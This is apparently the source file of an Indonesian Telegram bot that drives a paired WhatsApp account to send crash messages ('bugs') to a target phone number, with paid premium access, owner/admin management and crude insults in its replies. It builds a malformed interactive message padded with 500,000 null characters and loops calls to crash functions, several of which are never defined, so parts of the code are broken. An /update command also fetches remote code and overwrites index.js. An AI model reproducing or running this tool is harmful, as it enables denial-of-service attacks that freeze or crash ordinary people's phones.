const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const {
    default: makeWACosmoXet,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaconnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WACosmoXet,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('xatabail');
const pino = require('pino');
const chalk = require('chalk');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./TokenId/config");
const crypto = require('crypto');
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

const axios = require('axios');

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/Putraahere/DatabaseV3/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL, {
      timeout: 5000,
      validateStatus: s => s === 200
    });

    if (
      !res.data ||
      typeof res.data !== "object" ||
      !Array.isArray(res.data.tokens)
    ) {
      throw new Error("DATABASE TOKEN TIDAK VALID");
    }

    const tokens = res.data.tokens.filter(
      t => typeof t === "string" && t.length > 10
    );

    if (tokens.length === 0) {
      throw new Error("DATABASE TOKEN KOSONG");
    }

    console.log(chalk.green("✅ Database token valid"));
    return tokens;

  } catch (e) {
    console.error(chalk.red("❌ GAGAL MENGAKSES DATABASE TOKEN"));
    console.error(chalk.red(e.message));
    return null;
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token...\n"));

  if (!BOT_TOKEN || typeof BOT_TOKEN !== "string") {
    console.error(chalk.red("❌ TOKEN TIDAK DISET / INVALID"));
    return false;
  }

  const tokens = await fetchValidTokens();
  if (!tokens) return false;

  if (!tokens.includes(BOT_TOKEN.trim())) {
    console.log(chalk.red(`
═════════════════════
⛔ TOKEN TIDAK TERDAFTAR
═════════════════════
AKSES DITOLAK
`));
    return false;
  }

  console.log(chalk.green("✅ TOKEN VALID\n"));
  return true;
}

function startBot() {
  console.log(chalk.bold.red(`
» Information:
☇ Developer : Ryanzz
☇ Script    : Exorcist Community
☇ Version   : 2.0
`));
}

(async () => {
  const isValid = await validateToken();
  if (!isValid) return; 
  startBot();
})();


// --- Variabel Global ---
let CosmoX = null;
let isWhatsAppconnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./BaseCloud/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./BaseCloud/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./BaseCloud/ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
┏─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
┗─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./BaseCloud/userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Lo siapa ngentot? Kalo belum punya akses minta add dlu ya dekk.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    CosmoX = makeWACosmoXet(connectionOptions);

    CosmoX.ev.on('creds.update', saveCreds);
    store.bind(CosmoX.ev);

    CosmoX.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
       
            isWhatsAppconnected = true;
            console.log(chalk.white.bold(`
┏─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
┗─────────────────`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('WHATSAPP DISCONNECT')}
┗─────────────────`),
                shouldReconnect ? chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
┗─────────────────`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppconnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
┏─────────────────
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
┗─────────────────`));

    console.log(chalk.white.bold(`
┏━━━━━━─────────────────
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
┗━━━━━━─────────────────`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("xconnect", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id && !isAdmin(ctx.from.id))) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /xconnect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /xconnect 62𝐗𝐗𝐗");
    }

    if (CosmoX && CosmoX.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await CosmoX.requestPairingCode(phoneNumber, "KULTUSXX");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Kode pairing mu lek*

*Nomor:* ${phoneNumber}
*Kode:* \`${formattedCode}\`
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Lu siapa kontol?");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ List Babu Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Si Peler *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
  
    const ProsesColi = `\`\`\`\n
✦━━〔 𝐊𝐔𝐋𝐓𝐔𝐒 𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ━━✦

☠ 𝗦𝗧𝗔𝗧𝗨𝗦
↳ Bug telah berhasil dikirim ke target ritual

🩸 𝗡𝗢𝗧𝗘
↳ Tunggu ±5 menit sebelum pengiriman ulang
↳ Biarkan entitas pengirim tetap tersembunyi

⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
↳ Oleh entitas gelap: 𝚉𝙴𝚁𝙾𝚇 🕷️

✦━━━━━━━━━━━━━━━━━━━━━✦\`\`\`   `;

    await ctx.replyWithPhoto("https://files.catbox.moe/daxaxe.jpg", {
      caption: ProsesColi,
      parse_mode: "Markdown"
    })
};

const donerespone = async (target, ctx) => {
  
    const SuksesCrot = `\`\`\`\n
✦━━〔 𝐊𝐔𝐋𝐓𝐔𝐒 𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ━━✦

☠ 𝗦𝗧𝗔𝗧𝗨𝗦
↳ Bug telah berhasil dikirim ke target ritual

🩸 𝗡𝗢𝗧𝗘
↳ Tunggu ±5 menit sebelum pengiriman ulang
↳ Biarkan entitas pengirim tetap tersembunyi

⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
↳ Oleh entitas gelap: 𝚉𝙴𝚁𝙾𝚇 🕷️

✦━━━━━━━━━━━━━━━━━━━━━✦\`\`\`
    `;

    await ctx.replyWithPhoto("https://files.catbox.moe/mn8afh.jpg", {
      caption: SuksesCrot,
      parse_mode: "Markdown"
    })
};

const checkWhatsAppconnection = async (ctx, next) => {
    if (!isWhatsAppconnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /xconnect");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

///Function Bug\\\


// --- Command /crash (Placeholder for your actual crash functions) ---
bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 100; i++) {
      await invisihard3(target, true);
    }

    await donerespone(target, ctx);
});

bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await FrizHome(isTarget);
    }

    await donerespone(target, ctx);
});

bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

     for (let i = 0; i < 1; i++) {
     await bulldozer1TB(CosmoX, target);
     }

    await donerespone(target, ctx);
});

bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await Crash(target);
      await InvisibleFC(CosmoX, target);
    }

    await donerespone(target, ctx);
});

bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 35; i++) {
      await InvisibleFC(CosmoX, target);
      await FrizHome(isTarget);
      await Crash(target);
      await protocolbug8(target, true);
    }

    await donerespone(target, ctx);
});

bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 30; i++) {
      await protocolbug8(target, true);
      await InvisibleFC(CosmoX, target);
      await FrizHome(isTarget);
    }

    await donerespone(target, ctx);
});

bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 30; i++) {
      await protocolbug8(target, true);
      await invisihard3(target, true);
      await protocolbug7(target, true);
    }

    await donerespone(target, ctx);
});

bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 15; i++) {
      await ApiBug(22, target);
      await robustfreeze(target, Ptcp = true);
    }

    await donerespone(target, ctx);
});
//Fungsi Untuk Menghapus Bug
bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
    }

    await donerespone(target, ctx);
});


//auto update
bot.command("update", async (ctx) => {
  const chatId = ctx.chat.id;

  const repoRaw =
    "https://raw.githubusercontent.com/putxzz/Update/main/index.js";

  await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply(
      "✅ Update berhasil!\nSilakan restart bot."
    );

    // restart jika pakai PM2

  } catch (e) {
    console.error(e);
    ctx.reply(
      "❌ Update gagal. Pastikan repo dan file index.js tersedia."
    );
  }
});
//url catbox
const FormData = require("form-data");

bot.command("tourl", async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;

  if (
    !msg.reply_to_message ||
    (!msg.reply_to_message.document &&
     !msg.reply_to_message.photo &&
     !msg.reply_to_message.video)
  ) {
    return ctx.reply(
      "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```",
      { reply_to_message_id: msg.message_id, parse_mode: "Markdown" }
    );
  }

  const repliedMsg = msg.reply_to_message;
  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await ctx.reply(
      "```⌛\n⏳ Mengupload ke Catbox...```",
      { reply_to_message_id: msg.message_id, parse_mode: "Markdown" }
    );

    // ambil link file dari Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // download file sebagai stream
    const response = await axios.get(fileLink.href, {
      responseType: "stream",
    });

    // upload ke catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", response.data, {
      filename: fileName,
      contentType: response.headers["content-type"],
    });

    const { data: catboxUrl } = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    await ctx.telegram.editMessageText(
      chatId,
      processingMsg.message_id,
      null,
      `*✅ Upload berhasil! 📎URL:*\n\`\`\`\n${catboxUrl}\n\`\`\``,
      { parse_mode: "Markdown" }
